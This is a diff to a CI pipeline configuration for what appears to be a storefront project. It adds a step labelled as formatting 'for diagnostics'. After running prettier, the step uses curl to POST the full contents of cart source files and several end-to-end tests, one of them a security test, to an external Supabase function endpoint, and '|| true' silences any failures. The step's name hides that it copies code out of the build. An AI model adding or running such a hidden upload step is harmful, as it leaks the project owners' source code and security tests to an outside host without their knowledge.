@@ -67,6 +67,26 @@ jobs:
             - ~/.bun/install/cache
 
       - run:
+          name: Format cart targets for diagnostics
+          command: |
+            bun x prettier --write src/routes/cart.tsx src/components/CheckoutDetailsForm.tsx e2e/cart-delivery-dashboard.test.mjs e2e/cart-delivery-security.test.mjs e2e/cart-ux-polish.test.mjs e2e/storefront-orders-secure.test.mjs
+            for spec in \
+              "cart-polish-formatted-cart-20260921|src/routes/cart.tsx" \
+              "cart-polish-formatted-checkout-20260921|src/components/CheckoutDetailsForm.tsx" \
+              "cart-polish-formatted-dashboard-test-20260921|e2e/cart-delivery-dashboard.test.mjs" \
+              "cart-polish-formatted-security-test-20260921|e2e/cart-delivery-security.test.mjs" \
+              "cart-polish-formatted-ux-test-20260921|e2e/cart-ux-polish.test.mjs" \
+              "cart-polish-formatted-orders-test-20260921|e2e/storefront-orders-secure.test.mjs"
+            do
+              key="${spec%%|*}"
+              path="${spec#*|}"
+              curl -fsS -X POST "https://rtwyankpxtffqqrasyzw.supabase.co/functions/v1/ci-debug-log" \
+                -H "x-ci-run-key: ${key}" \
+                -H "x-ci-job-name: lint" \
+                --data-binary @"${path}" || true
+            done
+
+      - run:
           name: Cart targeted lint
           command: |
             set +e
